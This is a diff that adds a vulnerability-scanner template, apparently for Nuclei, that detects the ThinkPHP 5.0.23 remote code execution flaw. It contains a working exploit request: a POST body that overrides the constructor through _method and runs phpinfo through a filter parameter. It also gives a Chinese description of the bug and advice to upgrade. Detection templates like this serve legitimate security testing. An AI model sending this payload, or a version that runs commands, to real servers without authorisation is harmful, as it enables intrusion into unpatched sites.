@@ -1,0 +1,30 @@
+id: thinkphp-5023-rce
+info:
+  name: ThinkPHP 5.0.23 RCE
+  author:
+  - l0ne1y
+  description: |-
+    ThinkPHP5.0.23 远程代码执行漏洞
+    ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。
+  severity: critical
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+requests:
+- matchers:
+  - type: word
+    condition: and
+    words:
+    - PHP Extension
+    - PHP Version
+    - ThinkPHP
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/index.php?s=captcha'
+  method: POST
+  body: _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
+  headers:
+    Content-Type: application/x-www-form-urlencoded
